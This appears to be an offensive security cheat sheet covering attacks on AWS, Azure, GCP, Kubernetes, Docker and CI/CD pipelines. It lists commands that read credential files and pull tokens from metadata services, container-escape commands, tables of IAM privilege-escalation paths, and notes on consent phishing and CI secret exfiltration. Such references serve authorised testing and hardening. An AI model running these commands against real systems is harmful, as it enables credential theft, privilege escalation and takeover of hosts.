# Cloud, Containers & CI/CD

## 1. AWS

```bash
aws sts get-caller-identity
aws configure list; cat ~/.aws/credentials
enumerate-iam --access-key AK --secret SK
pacu                                   # console
prowler aws -M json-ocsf -o out/
scoutsuite aws --report-dir scout
```

**Enumeration order:** identity → policies/roles → S3 → EC2/IMDS → Lambda → ECR/ECS/EKS → Secrets Manager/SSM → CloudTrail/GuardDuty status.

```bash
aws iam list-users --query 'Users[].UserName'
aws iam list-attached-user-policies --user-name X
aws iam list-roles --query 'Roles[].Arn'
aws iam get-policy-version --policy-arn ARN --version-id v1
aws s3 ls; aws s3 ls s3://bucket --no-sign-request
aws secretsmanager list-secrets; aws ssm describe-parameters
```

**Privilege escalation paths**

| Permission | Escalation |
| --- | --- |
| `iam:CreatePolicyVersion` | New default policy version with `*` |
| `iam:SetDefaultPolicyVersion` | Activate attacker version |
| `iam:AttachUserPolicy` / `AttachRolePolicy` | Attach AdministratorAccess |
| `iam:PutUserPolicy` / `PutRolePolicy` | Inline admin |
| `iam:UpdateAssumeRolePolicy` | Trust attacker principal |
| `iam:PassRole` + `ec2:RunInstances` | Launch instance with privileged role |
| `iam:PassRole` + `lambda:CreateFunction` + `InvokeFunction` | Lambda as role |
| `iam:PassRole` + `glue:CreateDevEndpoint` | Glue with role |
| `iam:PassRole` + `cloudformation:CreateStack` | Stack with role |
| `sts:AssumeRole` chain | Follow trust chain to admin |
| `lambda:UpdateFunctionCode` | Inject into existing privileged function |

**IMDS:** `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` — SSRF target. IMDSv2 requires a PUT token; try both. ECS: `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`.

**S3:** anonymous list/read/write, `--no-sign-request`, bucket policy misconfig, static site hosting, versioning for deleted secrets, ACL public.

## 2. Azure / Entra ID

```bash
az login --use-device-code
az account show; az account list
az ad user list; az ad group list; az role assignment list --all
roadrecon auth -u user -p pass; roadrecon gather; roadrecon gui
```

Tools: `MicroBurst`, `AADInternals`, `ROADtools`, `Stormspotter`, `AzureHound`.

- **Managed identity:** `curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"`
- **Token theft:** PRT from a joined device → `roadrecon`, `aadinternals` `Get-AADIntUserPRTToken`.
- **Consent phishing:** register app, request `Mail.Read`, `offline_access`.
- **App registration abuse:** add credentials to an app with Graph permissions; `az ad app credential reset`.
- **Automation account / runbook** → code execution as its identity.
- **Key Vault** access policy misconfig → secrets.
- **Storage:** SAS token leakage, public container, account key in app config.
- **VM extension / custom script** → RCE on VM with its managed identity.

## 3. GCP

```bash
gcloud auth list; gcloud config list
gcloud projects list; gcloud iam service-accounts list
gcloud compute instances list; gcloud storage ls
gcp_enum.sh
```

- Metadata: `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`
- IAM: `roles/iam.serviceAccountTokenCreator`, `iam.serviceAccounts.actAs` + `compute.instances.create`, `setIamPolicy` on any resource.
- SA keys in repos/CI, default SA with editor role, Cloud Functions with privileged SA.

## 4. Kubernetes

```bash
kubectl auth can-i --list
kubectl get pods,svc,secrets,sa -A
kubectl get secret X -o jsonpath='{.data}' | base64 -d
kube-hunter --remote host
peirates
```

**Escape primitives**

| Condition | Technique |
| --- | --- |
| `privileged: true` | Mount host disk, `nsenter` to host PID 1 |
| `hostPath: /` | Write `/etc/cron.d`, host `.ssh`, or `chroot /host` |
| `hostPID: true` | `nsenter -t 1 -m -u -i -n -p -- sh` |
| `hostNetwork: true` | Reach node/kubelet/internal services |
| `CAP_SYS_ADMIN` | Mount, cgroup release_agent |
| `CAP_NET_RAW` | ARP spoof, packet capture |
| SA token with `create pods` | Create privileged pod on same node |
| `secrets` read | Grab cluster-admin token |

```bash
# privileged escape
nsenter -t 1 -m -u -i -n -p -- sh
# hostPath escape
mkdir /tmp/m && mount /dev/sda1 /tmp/m
```

Kubelet 10250 anonymous auth, `--anonymous-auth=true`, `/pods` → exec into containers. etcd 2379 unauthenticated → read all secrets.

## 5. Docker

```bash
docker -H tcp://host:2375 ps
docker -H tcp://host:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh
curl http://host:2375/containers/json
```

- Socket mounted in a container → host root.
- Registry v2 API anonymous → pull private images, read layers for secrets.
- Image history: `docker history --no-trunc`, `dive`.
- `docker-compose.yml`, `.env` in image layers.

## 6. CI/CD

**GitHub Actions**
- `pull_request_target` + checkout of PR code → secret exfil.
- Workflow injection: `${{ github.event.issue.title }}` in `run:` → command injection.
- Self-hosted runner on PR from fork.
- `GITHUB_TOKEN` with write perms, `permissions: write-all`.
- Artifact poisoning across workflows, cache poisoning.
- OIDC trust misconfig → assume cloud role from any repo.

**GitLab CI**
- `.gitlab-ci.yml` in MR branch, `CI_JOB_TOKEN` scope, protected branch bypass, runner shell executor.

**Jenkins**
- `/script` Groovy console → RCE.
- Credentials plugin → decrypt `credentials.xml` with `master.key` + `hudson.util.Secret`.
- Agent → controller via `jnlp`, build log secret leakage, `Jenkinsfile` from untrusted repo.

## 7. Triage order

1. Credentials in environment, metadata service, CI variables.
2. Identity permissions → escalation path (run an enumeration tool, don't guess).
3. Public storage and registries.
4. Workload identity → cloud role chain.
5. Escape primitives on any workload with host access.
